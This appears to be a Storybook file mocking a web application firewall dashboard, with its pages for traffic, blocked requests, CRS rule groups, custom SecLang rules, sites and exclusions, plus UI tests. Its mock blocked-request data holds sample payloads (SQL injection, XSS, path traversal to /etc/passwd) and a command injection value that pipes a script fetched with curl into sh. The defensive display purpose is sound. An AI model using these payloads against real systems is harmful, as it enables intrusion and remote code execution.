import { useMemo, useState } from "react";
import type { Meta, StoryObj } from "@storybook/react-vite";
import { expect, userEvent, within } from "storybook/test";
import { Activity, Ban, BookOpen, FileCode2, Globe, ListX, Plus, ShieldCheck, Sparkles } from "lucide-react";
import { ProductApp } from "../ProductFrame";
import { PageHeader } from "../../components/PageHeader";
import { Button } from "../../components/Button";
import { Callout } from "../../components/Callout";
import { KpiCard, KpiGrid } from "../../components/Kpi";
import { Panel } from "../../components/Panel";
import { FilterBar, FacetFilter, TimeRangePicker } from "../../components/Filters";
import { SearchInput, SelectField, Switch } from "../../components/Controls";
import { SegmentedControl } from "../../components/SegmentedControl";
import { DataTable, type Column } from "../../components/DataTable";
import { Badge, StatusBadge } from "../../components/Badge";
import { EntityChip } from "../../components/EntityChip";
import { TimeSeriesChart } from "../../charts/TimeSeriesChart";
import { BarList } from "../../charts/BarList";
import { formatNumber } from "../../lib/format";
import { PEOPLE, timeLabels, wave } from "../mocks";

const nav = [
  { id: "traffic", label: "Traffic", icon: Activity },
  { id: "blocked", label: "Blocked", icon: Ban, count: "1.4k" },
  { id: "rules", label: "Rules (OWASP CRS)", icon: BookOpen },
  { id: "custom", label: "Custom rules", icon: FileCode2, count: 12 },
  { id: "sites", label: "Sites", icon: Globe, count: 5 },
  { id: "exclusions", label: "Exclusions", icon: ListX },
];

const meta = {
  title: "Products/WAF",
  parameters: { layout: "fullscreen" },
} satisfies Meta;

export default meta;
type Story = StoryObj<typeof meta>;

const N = 48;
const labels = timeLabels(N, 30);

interface Blocked {
  id: string;
  time: string;
  ip: string;
  country: string;
  method: string;
  path: string;
  rule: string;
  ruleName: string;
  score: number;
  action: "blocked" | "logged";
  site: string;
}

const blocked: Blocked[] = [
  { id: "b1", time: "14:02:41", ip: "203.0.113.24", country: "NL", method: "GET", path: "/v1/orders?q=1'%20OR%20'1'='1", rule: "942100", ruleName: "SQLi via libinjection", score: 18, action: "blocked", site: "api.example.com" },
  { id: "b2", time: "14:02:13", ip: "198.51.100.201", country: "US", method: "POST", path: "/login", rule: "941100", ruleName: "XSS via libinjection", score: 10, action: "blocked", site: "app.example.com" },
  { id: "b3", time: "14:01:57", ip: "192.0.2.44", country: "DE", method: "GET", path: "/static/../../etc/passwd", rule: "930120", ruleName: "OS file access attempt", score: 15, action: "blocked", site: "www.example.com" },
  { id: "b4", time: "14:01:30", ip: "203.0.113.181", country: "SG", method: "GET", path: "/wp-login.php", rule: "913100", ruleName: "Scanner user-agent (sqlmap)", score: 5, action: "logged", site: "www.example.com" },
  { id: "b5", time: "14:00:52", ip: "198.51.100.7", country: "BR", method: "POST", path: "/v1/import", rule: "932160", ruleName: "Unix shell code found", score: 20, action: "blocked", site: "api.example.com" },
  { id: "b6", time: "14:00:11", ip: "203.0.113.9", country: "FR", method: "GET", path: "/search?q=<script>alert(1)</script>", rule: "941110", ruleName: "XSS script tag vector", score: 10, action: "blocked", site: "app.example.com" },
  { id: "b7", time: "13:59:48", ip: "198.51.100.96", country: "GB", method: "PUT", path: "/v1/users/42", rule: "920420", ruleName: "Content-Type not allowed", score: 3, action: "logged", site: "api.example.com" },
  { id: "b8", time: "13:59:20", ip: "203.0.113.24", country: "NL", method: "GET", path: "/v1/orders?q=1;SELECT%20pg_sleep(5)", rule: "942160", ruleName: "Blind SQLi sleep() test", score: 23, action: "blocked", site: "api.example.com" },
  { id: "b9", time: "13:58:44", ip: "192.0.2.44", country: "DE", method: "GET", path: "/.env", rule: "930130", ruleName: "Restricted file access", score: 8, action: "blocked", site: "www.example.com" },
];

const blockedColumns: Column<Blocked>[] = [
  { id: "time", header: "Time", mono: true, width: "84px", sortValue: (b) => b.time, cell: (b) => b.time },
  { id: "ip", header: "Client IP", width: "150px", cell: (b) => <EntityChip kind="ip" value={b.ip} hideKind href="#ip" /> },
  { id: "country", header: "Country", width: "72px", mono: true, cell: (b) => b.country },
  {
    id: "request",
    header: "Request",
    cell: (b) => (
      <span className="flex min-w-0 flex-col">
        <span className="flex min-w-0 items-center gap-1.5 font-mono text-xs">
          <Badge mono>{b.method}</Badge>
          <span className="truncate">{b.path}</span>
        </span>
        <span className="truncate text-2xs text-fg-muted">{b.site}</span>
      </span>
    ),
  },
  {
    id: "rule",
    header: "Rule",
    width: "200px",
    sortValue: (b) => b.rule,
    cell: (b) => (
      <span className="flex flex-col">
        <span className="font-mono text-xs">{b.rule}</span>
        <span className="truncate text-2xs text-fg-muted">{b.ruleName}</span>
      </span>
    ),
  },
  { id: "score", header: "Anomaly", align: "right", mono: true, width: "84px", sortValue: (b) => b.score, cell: (b) => b.score },
  {
    id: "action",
    header: "Action",
    width: "100px",
    cell: (b) => (b.action === "blocked" ? <StatusBadge tone="danger">Blocked</StatusBadge> : <StatusBadge tone="warning">Logged</StatusBadge>),
  },
];

interface Suggestion {
  id: string;
  title: string;
  target: string;
  finding: string;
  rule: string;
  enabled: boolean;
}

const initialSuggestions: Suggestion[] = [
  { id: "vp-1", title: "Virtual patch: SQL injection in q", target: "GET api.example.com/v1/orders?q=", finding: "DAST-318 · confirmed · High", rule: "SecRule ARGS:q \"@detectSQLi\" id:1000318,phase:2,deny", enabled: false },
  { id: "vp-2", title: "Virtual patch: reflected XSS in redirect", target: "GET app.example.com/auth/callback?redirect=", finding: "DAST-322 · confirmed · Medium", rule: "SecRule ARGS:redirect \"@detectXSS\" id:1000322,phase:2,deny", enabled: false },
  { id: "vp-3", title: "Rate limit password reset", target: "POST app.example.com/password/reset", finding: "DAST-301 · Low", rule: "SecAction id:1000301 · 5 req/min per IP", enabled: true },
];

/** Traffic: allowed vs blocked, blocked requests with CRS rule ids, and virtual patches generated from DAST findings. */
function TrafficPage() {
  const [range, setRange] = useState("24h");
  const [mode, setMode] = useState<"detect" | "block">("block");
  const [sites, setSites] = useState<string[]>([]);
  const [action, setAction] = useState<string[]>([]);
  const [suggestions, setSuggestions] = useState(initialSuggestions);
  const rows = useMemo(
    () => blocked.filter((b) => (sites.length === 0 || sites.includes(b.site)) && (action.length === 0 || action.includes(b.action))),
    [sites, action],
  );
  const enable = (id: string) => setSuggestions((s) => s.map((x) => (x.id === id ? { ...x, enabled: true } : x)));
  return (
    <>
      <PageHeader
        title="Traffic"
        description="Coraza 3.2 · OWASP CRS 4.7 · paranoia level 2 · 5 sites"
        meta={mode === "block" ? <StatusBadge tone="success">Blocking</StatusBadge> : <StatusBadge tone="warning">Detect only</StatusBadge>}
        actions={
          <>
            <SegmentedControl
              label="WAF mode"
              size="md"
              value={mode}
              onChange={setMode}
              options={[
                { value: "detect", label: "Detect" },
                { value: "block", label: "Block" },
              ]}
            />
            <Button size="md" variant="primary" icon={<Plus />}>
              Custom rule
            </Button>
          </>
        }
      />
      <FilterBar
        onClear={
          sites.length || action.length
            ? () => {
                setSites([]);
                setAction([]);
              }
            : undefined
        }
      >
        <TimeRangePicker value={range} onChange={setRange} />
        <FacetFilter
          label="Site"
          selected={sites}
          onChange={setSites}
          options={["api.example.com", "app.example.com", "www.example.com"].map((s) => ({ value: s, count: blocked.filter((b) => b.site === s).length }))}
        />
        <FacetFilter
          label="Action"
          selected={action}
          onChange={setAction}
          options={[
            { value: "blocked", label: "Blocked", count: blocked.filter((b) => b.action === "blocked").length },
            { value: "logged", label: "Logged", count: blocked.filter((b) => b.action === "logged").length },
          ]}
        />
        <SearchInput label="Search IP, path or rule id" className="w-64" />
      </FilterBar>
      <KpiGrid>
        <KpiCard label="Requests · 24 h" value="18.4M" unit="212 req/s avg" trend={wave(24, { base: 210, amp: 80, seed: 61 })} delta={{ label: "+4% vs. yesterday", direction: "up" }} />
        <KpiCard
          label="Blocked"
          value="0.42%"
          unit="77.3k requests"
          tone="danger"
          trendColor="var(--oa-danger)"
          trend={wave(24, { base: 3, amp: 1, seed: 62, spike: 4, spikeAt: 18 })}
          delta={{ label: "Spike from 203.0.113.24 at 13:10", direction: "up", intent: "bad" }}
        />
        <KpiCard label="Top attack class" value="SQLi" unit="41% of blocks" delta={{ label: "CRS 942xxx · mostly /v1/orders" }} />
        <KpiCard label="False positive rate" value="0.03%" unit="est." delta={{ label: "12 exclusions active", direction: "down", intent: "good" }} />
      </KpiGrid>
      <div className="grid gap-2.5 xl:grid-cols-[minmax(0,2fr)_minmax(0,1fr)]">
        <Panel title="Requests per second" description="Allowed and blocked, stacked">
          <TimeSeriesChart
            label="Allowed versus blocked requests per second"
            labels={labels}
            stacked
            height={200}
            xTicks={8}
            format={(v) => `${Math.round(v)} req/s`}
            series={[
              { id: "allowed", name: "Allowed", data: wave(N, { base: 200, amp: 80, seed: 63, phase: -1 }) },
              { id: "blocked", name: "Blocked", color: "var(--oa-danger)", data: wave(N, { base: 2, amp: 1.5, seed: 64, spike: 14, spikeAt: 36, spikeLen: 4 }) },
            ]}
          />
        </Panel>
        <Panel title="Blocks by attack class">
          <BarList
            label="Blocked requests by attack class"
            items={[
              { id: "sqli", label: "SQL injection (942)", value: 31_840 },
              { id: "xss", label: "Cross-site scripting (941)", value: 17_210 },
              { id: "lfi", label: "Local file inclusion (930)", value: 12_090 },
              { id: "rce", label: "Remote code execution (932)", value: 8_430 },
              { id: "scan", label: "Scanner detection (913)", value: 5_120 },
              { id: "proto", label: "Protocol enforcement (920)", value: 2_610 },
            ]}
          />
        </Panel>
      </div>
      <div className="grid gap-2.5 xl:grid-cols-[minmax(0,2fr)_minmax(0,1fr)]">
        <Panel title="Blocked requests" description={`${rows.length} of ${blocked.length} shown · last 5 minutes`} actions={<Button size="sm" variant="ghost">Open Blocked</Button>} flush>
          <DataTable
            label="Blocked requests"
            columns={blockedColumns}
            rows={rows}
            getRowId={(b) => b.id}
            defaultSort={{ id: "time", direction: "desc" }}
            minWidth={920}
            empty={<p className="py-8">No requests match these filters</p>}
          />
        </Panel>
        <Panel title="Rules from DAST findings" description="Virtual patches until the code is fixed" flush>
          <ul className="flex flex-col" aria-label="Suggested rules">
            {suggestions.map((s) => (
              <li key={s.id} className="flex flex-col gap-1.5 border-b border-subtle px-3 py-2.5 last:border-0">
                <div className="flex items-start justify-between gap-2">
                  <span className="flex min-w-0 flex-col">
                    <span className="flex items-center gap-1.5 text-sm font-medium">
                      <Sparkles aria-hidden className="size-3.5 shrink-0 text-accent-text" />
                      {s.title}
                    </span>
                    <span className="truncate font-mono text-2xs text-fg-muted">{s.target}</span>
                  </span>
                  {s.enabled ? (
                    <StatusBadge tone="success" data-testid={`status-${s.id}`}>
                      Enabled
                    </StatusBadge>
                  ) : (
                    <StatusBadge tone="info" data-testid={`status-${s.id}`}>
                      Suggested
                    </StatusBadge>
                  )}
                </div>
                <code className="block overflow-x-auto rounded bg-subtle px-2 py-1 font-mono text-2xs whitespace-nowrap text-fg">{s.rule}</code>
                <div className="flex items-center justify-between gap-2">
                  <span className="text-2xs text-fg-muted">From {s.finding}</span>
                  {!s.enabled && (
                    <Button size="xs" variant="primary" icon={<ShieldCheck />} aria-label={`Enable ${s.title}`} onClick={() => enable(s.id)}>
                      Enable
                    </Button>
                  )}
                </div>
              </li>
            ))}
          </ul>
        </Panel>
      </div>
    </>
  );
  
}

/* ------------------------------------------------------------------ */
/* Blocked                                                             */
/* ------------------------------------------------------------------ */

const MATCHED: Record<string, { variable: string; data: string; ua: string }> = {
  b1: { variable: "ARGS:q", data: "1' OR '1'='1", ua: "sqlmap/1.8.4#stable (https://sqlmap.org)" },
  b2: { variable: "ARGS:username", data: "<svg/onload=alert(document.domain)>", ua: "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0" },
  b3: { variable: "REQUEST_FILENAME", data: "/static/../../etc/passwd", ua: "curl/8.5.0" },
  b4: { variable: "REQUEST_HEADERS:User-Agent", data: "sqlmap", ua: "sqlmap/1.8.4" },
  b5: { variable: "ARGS:url", data: ";curl http://203.0.113.181/x.sh|sh", ua: "python-requests/2.32.3" },
  b6: { variable: "ARGS:q", data: "<script>alert(1)</script>", ua: "Mozilla/5.0 (Windows NT 10.0) Chrome/129" },
  b7: { variable: "REQUEST_HEADERS:Content-Type", data: "application/x-yaml", ua: "acme-sync/2.1" },
  b8: { variable: "ARGS:q", data: "1;SELECT pg_sleep(5)", ua: "sqlmap/1.8.4#stable" },
  b9: { variable: "REQUEST_FILENAME", data: "/.env", ua: "Go-http-client/1.1" },
};

function BlockedPage() {
  const [q, setQ] = useState("");
  const [active, setActive] = useState("b1");
  const [banned, setBanned] = useState<string[]>([]);
  const [excluded, setExcluded] = useState<string | null>(null);
  const rows = blocked.filter((b) => !q || `${b.ip} ${b.path} ${b.rule} ${b.ruleName}`.toLowerCase().includes(q.toLowerCase()));
  const cur = blocked.find((b) => b.id === active);
  const m = cur ? MATCHED[cur.id] : undefined;
  return (
    <>
      <PageHeader title="Blocked" description="Requests that matched CRS or custom rules. Logged requests scored below the blocking threshold of 5." actions={<SearchInput label="Search blocked requests" value={q} onChange={(e) => setQ(e.target.value)} className="w-64" />} />
      <div className="grid gap-2.5 xl:grid-cols-[minmax(0,3fr)_minmax(0,2fr)]">
        <Panel title="Requests" description={`${rows.length} shown`} flush>
          <DataTable label="Blocked log" columns={blockedColumns} rows={rows} getRowId={(b) => b.id} onRowClick={(b) => (setActive(b.id), setExcluded(null))} activeRowId={active} defaultSort={{ id: "time", direction: "desc" }} minWidth={920} empty={<p className="py-8">No requests match</p>} />
        </Panel>
        <Panel title="Match" description={cur ? `${cur.rule} · ${cur.ruleName}` : "No request selected"} aria-label="Match detail">
          {cur && m && (
            <div className="flex flex-col gap-2.5 text-sm">
              <dl className="grid grid-cols-[auto_minmax(0,1fr)] gap-x-3 gap-y-1">
                <dt className="text-fg-muted">Matched</dt>
                <dd className="font-mono text-xs">{m.variable}</dd>
                <dt className="text-fg-muted">Value</dt>
                <dd className="font-mono text-xs break-all">{m.data}</dd>
                <dt className="text-fg-muted">User agent</dt>
                <dd className="font-mono text-xs break-all">{m.ua}</dd>
                <dt className="text-fg-muted">Anomaly score</dt>
                <dd>{cur.score} (threshold 5)</dd>
              </dl>
              <div className="flex flex-wrap gap-1.5 border-t border-line pt-2">
                <Button size="sm" variant="danger" icon={<Ban />} disabled={banned.includes(cur.ip)} onClick={() => setBanned((b) => [...b, cur.ip])}>
                  {banned.includes(cur.ip) ? "IP blocked" : "Block IP for 24 h"}
                </Button>
                <Button size="sm" onClick={() => setExcluded(`Exclusion drafted: rule ${cur.rule} on ${m.variable} for ${cur.site}`)}>
                  False positive
                </Button>
              </div>
              {excluded && (
                <p role="status" className="text-xs text-success">
                  {excluded}
                </p>
              )}
            </div>
          )}
        </Panel>
      </div>
    </>
  );
}

/* ------------------------------------------------------------------ */
/* Rules (OWASP CRS)                                                   */
/* ------------------------------------------------------------------ */

interface RuleGroup {
  id: string;
  name: string;
  rules: number;
  paranoia: 1 | 2 | 3 | 4;
  hits24h: number;
  enabled: boolean;
}

const RULE_GROUPS: RuleGroup[] = [
  { id: "913", name: "Scanner detection", rules: 6, paranoia: 1, hits24h: 5120, enabled: true },
  { id: "920", name: "Protocol enforcement", rules: 64, paranoia: 2, hits24h: 2610, enabled: true },
  { id: "921", name: "Protocol attack", rules: 18, paranoia: 1, hits24h: 410, enabled: true },
  { id: "930", name: "Local file inclusion", rules: 8, paranoia: 1, hits24h: 12090, enabled: true },
  { id: "931", name: "Remote file inclusion", rules: 8, paranoia: 2, hits24h: 190, enabled: true },
  { id: "932", name: "Remote code execution", rules: 38, paranoia: 2, hits24h: 8430, enabled: true },
  { id: "933", name: "PHP injection", rules: 25, paranoia: 1, hits24h: 640, enabled: false },
  { id: "934", name: "Node.js injection", rules: 6, paranoia: 1, hits24h: 12, enabled: true },
  { id: "941", name: "Cross-site scripting", rules: 37, paranoia: 2, hits24h: 17210, enabled: true },
  { id: "942", name: "SQL injection", rules: 72, paranoia: 2, hits24h: 31840, enabled: true },
  { id: "943", name: "Session fixation", rules: 3, paranoia: 1, hits24h: 2, enabled: true },
  { id: "944", name: "Java attacks", rules: 19, paranoia: 1, hits24h: 88, enabled: true },
];

function RulesPage() {
  const [enabled, setEnabled] = useState<Record<string, boolean>>(Object.fromEntries(RULE_GROUPS.map((g) => [g.id, g.enabled])));
  const [paranoia, setParanoia] = useState("2");
  const cols: Column<RuleGroup>[] = [
    { id: "id", header: "Group", mono: true, width: "70px", cell: (g) => `${g.id}xxx` },
    { id: "name", header: "Name", cell: (g) => <span className="font-medium">{g.name}</span> },
    { id: "rules", header: "Rules", align: "right", mono: true, cell: (g) => g.rules },
    { id: "pl", header: "From paranoia", align: "right", mono: true, description: "Rules in this group start applying at this paranoia level. Higher levels catch more and cause more false positives.", cell: (g) => `PL${g.paranoia}` },
    { id: "hits", header: "Hits · 24 h", align: "right", mono: true, sortValue: (g) => g.hits24h, cell: (g) => formatNumber(g.hits24h) },
    { id: "on", header: "Enabled", cell: (g) => <Switch checked={enabled[g.id] ?? false} onCheckedChange={(v) => setEnabled((e) => ({ ...e, [g.id]: v }))} label={<span className="sr-only">Enable {g.name}</span>} /> },
  ];
  return (
    <>
      <PageHeader title="Rules (OWASP CRS)" description="OWASP Core Rule Set 4.7, updated weekly. Disable a group only if no site uses that stack." />
      <FilterBar>
        <SelectField label="Paranoia level" value={paranoia} onChange={(e) => setParanoia(e.target.value)} options={["1", "2", "3", "4"].map((v) => ({ value: v, label: `PL${v}${v === "2" ? " (recommended)" : ""}` }))} />
      </FilterBar>
      {paranoia !== "2" && (
        <Callout tone="warning" title={`PL${paranoia} ${Number(paranoia) > 2 ? "will raise false positives" : "lets more attacks through"}`}>
          Try it in Detect mode for a week first and watch the Blocked page.
        </Callout>
      )}
      <Panel title="Rule groups" description={`${Object.values(enabled).filter(Boolean).length} of ${RULE_GROUPS.length} enabled`} flush>
        <DataTable label="CRS rule groups" columns={cols} rows={RULE_GROUPS} getRowId={(g) => g.id} defaultSort={{ id: "hits", direction: "desc" }} minWidth={760} />
      </Panel>
    </>
  );
}

/* ------------------------------------------------------------------ */
/* Custom rules                                                        */
/* ------------------------------------------------------------------ */

interface CustomRule {
  id: string;
  name: string;
  rule: string;
  site: string;
  hits24h: number;
  author: string;
}

const CUSTOM: CustomRule[] = [
  ...initialSuggestions.map((s, i) => ({ id: s.id, name: s.title, rule: s.rule, site: s.target.split(" ")[1]!.split("/")[0]!, hits24h: [0, 0, 41][i] ?? 0, author: "DAST" })),
  { id: "cr-4", name: "Block admin paths from outside VPN", rule: "SecRule REQUEST_URI \"@beginsWith /admin\" \"chain,id:1000401,phase:1,deny\"\n  SecRule REMOTE_ADDR \"!@ipMatch 10.8.0.0/16\"", site: "app.example.com", hits24h: 812, author: PEOPLE[4] },
  { id: "cr-5", name: "Geo block for payment API", rule: "SecRule GEO:COUNTRY_CODE \"@pm KP IR\" \"id:1000402,phase:1,deny\"", site: "api.example.com", hits24h: 6, author: PEOPLE[4] },
  { id: "cr-6", name: "Limit /v1/orders?q length", rule: "SecRule ARGS:q \"@gt 256\" \"id:1000403,phase:2,deny,t:length\"", site: "api.example.com", hits24h: 19, author: PEOPLE[0] },
];

function CustomRulesPage() {
  const [active, setActive] = useState("cr-4");
  const [drafts, setDrafts] = useState<Record<string, string>>(Object.fromEntries(CUSTOM.map((r) => [r.id, r.rule])));
  const [tested, setTested] = useState<string | null>(null);
  const cur = CUSTOM.find((r) => r.id === active);
  const cols: Column<CustomRule>[] = [
    { id: "name", header: "Rule", width: "40%", cell: (r) => <span className="block truncate font-medium">{r.name}</span> },
    { id: "site", header: "Site", mono: true, cell: (r) => r.site },
    { id: "hits", header: "Hits · 24 h", align: "right", mono: true, sortValue: (r) => r.hits24h, cell: (r) => formatNumber(r.hits24h) },
    { id: "author", header: "Author", cell: (r) => <span className="text-xs">{r.author}</span> },
  ];
  return (
    <>
      <PageHeader title="Custom rules" description="SecLang rules evaluated after CRS. IDs 1000000–1999999 are reserved for you." actions={<Button variant="primary" icon={<Plus />}>New rule</Button>} />
      <div className="grid gap-2.5 xl:grid-cols-[minmax(0,1fr)_minmax(0,1fr)]">
        <Panel title="Rules" flush>
          <DataTable label="Custom rules" columns={cols} rows={CUSTOM} getRowId={(r) => r.id} onRowClick={(r) => (setActive(r.id), setTested(null))} activeRowId={active} minWidth={560} />
        </Panel>
        {cur && (
          <Panel title="Edit rule" description={cur.name} aria-label="Edit rule">
            <div className="flex flex-col gap-2">
              <label className="flex flex-col gap-1 text-xs font-medium">
                SecLang
                <textarea value={drafts[cur.id] ?? ""} onChange={(e) => (setDrafts((d) => ({ ...d, [cur.id]: e.target.value })), setTested(null))} rows={5} className="rounded-md border border-line-strong bg-surface p-2 font-mono text-xs text-fg" />
              </label>
              <div className="flex gap-1.5">
                <Button size="sm" onClick={() => setTested(`Syntax OK · would have matched ${cur.hits24h} of 18.4 M requests in the last 24 h`)}>
                  Test against last 24 h
                </Button>
                <Button size="sm" variant="primary">
                  Save
                </Button>
              </div>
              {tested && (
                <p role="status" className="text-xs text-success">
                  {tested}
                </p>
              )}
            </div>
          </Panel>
        )}
      </div>
    </>
  );
}

/* ------------------------------------------------------------------ */
/* Sites                                                               */
/* ------------------------------------------------------------------ */

interface Site {
  id: string;
  host: string;
  upstream: string;
  mode: "block" | "detect";
  rps: number;
  blockedPct: number;
  tls: string;
  exclusions: number;
}

const SITES: Site[] = [
  { id: "s1", host: "api.example.com", upstream: "http://10.20.4.0:8080 (4 targets)", mode: "block", rps: 118, blockedPct: 0.61, tls: "TLS 1.3 · expires in 64 d", exclusions: 5 },
  { id: "s2", host: "app.example.com", upstream: "http://10.20.5.0:3000 (3 targets)", mode: "block", rps: 64, blockedPct: 0.38, tls: "TLS 1.3 · expires in 64 d", exclusions: 4 },
  { id: "s3", host: "www.example.com", upstream: "http://10.20.6.10:80", mode: "block", rps: 22, blockedPct: 0.21, tls: "TLS 1.3 · expires in 201 d", exclusions: 1 },
  { id: "s4", host: "status.example.com", upstream: "http://10.20.6.20:80", mode: "block", rps: 4, blockedPct: 0.02, tls: "TLS 1.3 · expires in 201 d", exclusions: 0 },
  { id: "s5", host: "legacy-api.example.com", upstream: "http://10.30.1.4:8080", mode: "detect", rps: 4, blockedPct: 0, tls: "TLS 1.2 · expires in 9 d", exclusions: 2 },
];

function SitesPage() {
  const [modes, setModes] = useState<Record<string, Site["mode"]>>(Object.fromEntries(SITES.map((s) => [s.id, s.mode])));
  const cols: Column<Site>[] = [
    { id: "host", header: "Site", cell: (s) => <EntityChip kind="url" value={s.host} hideKind /> },
    { id: "upstream", header: "Upstream", cell: (s) => <span className="font-mono text-xs">{s.upstream}</span> },
    { id: "rps", header: "req/s", align: "right", mono: true, sortValue: (s) => s.rps, cell: (s) => s.rps },
    { id: "blocked", header: "Blocked", align: "right", mono: true, cell: (s) => `${s.blockedPct}%` },
    { id: "tls", header: "TLS", cell: (s) => <span className={s.tls.includes("9 d") ? "text-xs text-warning-text" : "text-xs"}>{s.tls}</span> },
    { id: "excl", header: "Exclusions", align: "right", mono: true, cell: (s) => s.exclusions },
    {
      id: "mode",
      header: "Mode",
      width: "160px",
      cell: (s) => (
        <SegmentedControl
          label={`Mode for ${s.host}`}
          value={modes[s.id] ?? s.mode}
          onChange={(m) => setModes((x) => ({ ...x, [s.id]: m }))}
          options={[
            { value: "detect", label: "Detect" },
            { value: "block", label: "Block" },
          ]}
        />
      ),
    },
  ];
  return (
    <>
      <PageHeader title="Sites" description="Hostnames the WAF proxies. Each site has its own mode, exclusions and upstream." actions={<Button variant="primary" icon={<Plus />}>Add site</Button>} />
      <Callout tone="warning" title="legacy-api.example.com is in detect mode">
        It has logged 1,204 attacks this week that were not blocked. Switch it to Block once the 2 exclusions are reviewed.
      </Callout>
      <Panel title="Sites" flush>
        <DataTable label="Sites" columns={cols} rows={SITES} getRowId={(s) => s.id} minWidth={1000} />
      </Panel>
    </>
  );
}

/* ------------------------------------------------------------------ */
/* Exclusions                                                          */
/* ------------------------------------------------------------------ */

interface Exclusion {
  id: string;
  rule: string;
  site: string;
  target: string;
  reason: string;
  author: string;
  created: string;
  hits7d: number;
}

const EXCLUSIONS: Exclusion[] = [
  { id: "e1", rule: "942100", site: "api.example.com", target: "ARGS:filter on /v1/reports", reason: "Report filter accepts SQL-like expressions", author: PEOPLE[0], created: "Sep 3", hits7d: 1840 },
  { id: "e2", rule: "941100", site: "app.example.com", target: "ARGS:body on /notes", reason: "Rich-text editor sends HTML", author: PEOPLE[7], created: "Aug 21", hits7d: 920 },
  { id: "e3", rule: "920420", site: "api.example.com", target: "Content-Type application/x-yaml on /v1/import", reason: "Import accepts YAML", author: PEOPLE[3], created: "Oct 2", hits7d: 34 },
  { id: "e4", rule: "932160", site: "legacy-api.example.com", target: "ARGS:cmd on /ops/run", reason: "Legacy ops endpoint, VPN only", author: PEOPLE[4], created: "Jun 11", hits7d: 0 },
  { id: "e5", rule: "930120", site: "www.example.com", target: "REQUEST_FILENAME /docs/../", reason: "Old doc links", author: PEOPLE[5], created: "Mar 4", hits7d: 0 },
];

function ExclusionsPage() {
  const [items, setItems] = useState(EXCLUSIONS);
  const [unused, setUnused] = useState(false);
  const rows = items.filter((e) => !unused || e.hits7d === 0);
  const cols: Column<Exclusion>[] = [
    { id: "rule", header: "Rule", mono: true, width: "80px", cell: (e) => e.rule },
    { id: "site", header: "Site", mono: true, cell: (e) => e.site },
    { id: "target", header: "Applies to", width: "26%", cell: (e) => <span className="block truncate font-mono text-xs">{e.target}</span> },
    { id: "reason", header: "Reason", width: "24%", cell: (e) => <span className="block truncate text-xs">{e.reason}</span> },
    { id: "author", header: "Author", cell: (e) => <span className="text-xs">{e.author}</span> },
    { id: "hits", header: "Hits · 7 d", align: "right", mono: true, sortValue: (e) => e.hits7d, cell: (e) => (e.hits7d === 0 ? <Badge tone="warning">0</Badge> : formatNumber(e.hits7d)) },
    {
      id: "act",
      header: "",
      width: "84px",
      hideable: false,
      cell: (e) => (
        <Button size="xs" variant="ghost" onClick={() => setItems((all) => all.filter((x) => x.id !== e.id))} aria-label={`Remove exclusion ${e.rule} on ${e.site}`}>
          Remove
        </Button>
      ),
    },
  ];
  return (
    <>
      <PageHeader title="Exclusions" description="Narrow exceptions for false positives. Each one weakens protection a little, so unused ones should go." actions={<Button variant="primary" icon={<Plus />}>New exclusion</Button>} />
      <FilterBar onClear={unused ? () => setUnused(false) : undefined}>
        <Switch checked={unused} onCheckedChange={setUnused} label="Only unused for 7 days" />
      </FilterBar>
      <Panel title="Exclusions" description={`${rows.length} shown`} flush>
        <DataTable label="Exclusions" columns={cols} rows={rows} getRowId={(e) => e.id} minWidth={1000} empty={<p className="py-8">No exclusions</p>} />
      </Panel>
    </>
  );
}

const PAGES = {
  traffic: () => <TrafficPage />,
  blocked: () => <BlockedPage />,
  rules: () => <RulesPage />,
  custom: () => <CustomRulesPage />,
  sites: () => <SitesPage />,
  exclusions: () => <ExclusionsPage />,
};

const app = (initial: string): Story => ({ render: () => <ProductApp product="waf" nav={nav} pages={PAGES} initial={initial} /> });

/* ------------------------------------------------------------------ */
/* Stories: one per page; the nav switches pages inside each.          */
/* ------------------------------------------------------------------ */

export const Traffic: Story = {
  ...app("traffic"),
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    await expect(c.getByRole("heading", { level: 1, name: "Traffic" })).toBeInTheDocument();
    await expect(within(c.getByRole("table", { name: "Blocked requests" })).getAllByRole("row")).toHaveLength(blocked.length + 1);

    await expect(c.getByTestId("status-vp-1")).toHaveTextContent("Suggested");
    await userEvent.click(c.getByRole("button", { name: "Enable Virtual patch: SQL injection in q" }));
    await expect(c.getByTestId("status-vp-1")).toHaveTextContent("Enabled");
    await expect(c.queryByRole("button", { name: "Enable Virtual patch: SQL injection in q" })).not.toBeInTheDocument();

    await userEvent.click(c.getByRole("radio", { name: "Detect" }));
    await expect(c.getByRole("radio", { name: "Detect" })).toHaveAttribute("aria-checked", "true");
    await expect(c.getByText("Detect only")).toBeInTheDocument();
  },
};

export const BlockedRequests: Story = {
  name: "Blocked",
  ...app("blocked"),
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    await expect(c.getByLabelText("Match detail")).toHaveTextContent("1' OR '1'='1");
    await userEvent.click(c.getByRole("button", { name: "Block IP for 24 h" }));
    await expect(c.getByRole("button", { name: "IP blocked" })).toBeDisabled();
    await userEvent.click(within(c.getByRole("table", { name: "Blocked log" })).getByText("PUT"));
    await userEvent.click(c.getByRole("button", { name: "False positive" }));
    await expect(c.getByText(/Exclusion drafted: rule 920420/)).toBeInTheDocument();
  },
};

export const Rules: Story = {
  name: "Rules (OWASP CRS)",
  ...app("rules"),
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    await userEvent.click(c.getByRole("switch", { name: "Enable PHP injection" }));
    await expect(c.getByText("12 of 12 enabled")).toBeInTheDocument();
    await userEvent.selectOptions(c.getByRole("combobox", { name: "Paranoia level" }), "3");
    await expect(c.getByText("PL3 will raise false positives")).toBeInTheDocument();
  },
};

export const CustomRules: Story = {
  name: "Custom rules",
  ...app("custom"),
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    await userEvent.click(c.getByRole("button", { name: "Test against last 24 h" }));
    await expect(c.getByText(/would have matched 812/)).toBeInTheDocument();
  },
};

export const Sites: Story = {
  ...app("sites"),
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    const group = within(c.getByRole("radiogroup", { name: "Mode for legacy-api.example.com" }));
    await userEvent.click(group.getByRole("radio", { name: "Block" }));
    await expect(group.getByRole("radio", { name: "Block" })).toHaveAttribute("aria-checked", "true");
  },
};

export const Exclusions: Story = {
  ...app("exclusions"),
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    await userEvent.click(c.getByRole("switch", { name: "Only unused for 7 days" }));
    await expect(c.getByRole("table", { name: "Exclusions" }).querySelectorAll("tbody tr")).toHaveLength(2);
